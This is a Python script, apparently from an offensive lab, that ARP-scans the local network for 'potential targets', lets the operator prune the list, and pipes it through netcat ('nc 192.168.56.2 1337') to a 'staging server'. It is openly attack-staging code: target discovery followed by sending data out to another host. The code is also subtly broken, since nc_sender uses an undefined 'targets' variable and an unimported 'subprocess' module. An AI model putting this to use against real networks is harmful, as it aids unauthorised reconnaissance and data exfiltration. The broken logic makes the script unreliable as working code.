from subprocess import call
from re import findall

def get_targets():
#arp scan the network to collect a list of potential targets

    potential_targets=[]

    #run the arp scan
    call("arp -a > stored_arp.txt", shell=True)
    arp_list = open("stored_arp.txt", "r")
    arp_list = arp_list.read()

    #regex pattern to identify ips
    pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'   
    
    #put ips into list of potential targets
    potential_targets = findall(pattern, arp_list)
    print(potential_targets)
    return potential_targets

def remove_unwanted(potential_targets):
#given a list of potential targets, collect user input on which to remove from targets

	x = 1
	#print out a numbered list of targets
	for i in potential_targets:
		print(str(x)+": "+str(i))
		x += 1


	unwanted = input("Please select unwanted ips, separated by commas: ")
	#ask users to select which ips are unwanted and make it a list
	unwanted = unwanted.split(",")

	unwanted_ips = []
	#add unwanted ips to a list
	for i in unwanted:
		unwanted_ips.append(potential_targets[int(i) - 1])

	#remove unwanted ips from the final target list
	for i in unwanted_ips:
		potential_targets.remove(i)

	print(potential_targets)
	return potential_targets

def get_ip():
#function to find the ip of the host device

	#run ifconfig and store the output
	call("ifconfig > ifconfig.txt", shell=True)
	ifconfig = open("ifconfig.txt", "r")
	ifconfig = ifconfig.read()

	#regex pattern to find the ips
	pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' 
	ip = findall(pattern, ifconfig)
	return ip[0]

def nc_sender():
#given a list of targets, send it to the staging server

	sender = "echo " + targets + " | nc 192.168.56.2 1337"
	subprocess.call(sender, shell=True)

def main():
	ip = get_ip()
	potential_targets = (get_targets())
	targets = remove_unwanted(potential_targets)
	nc_sender()

if __name__ == "__main__":
	main()
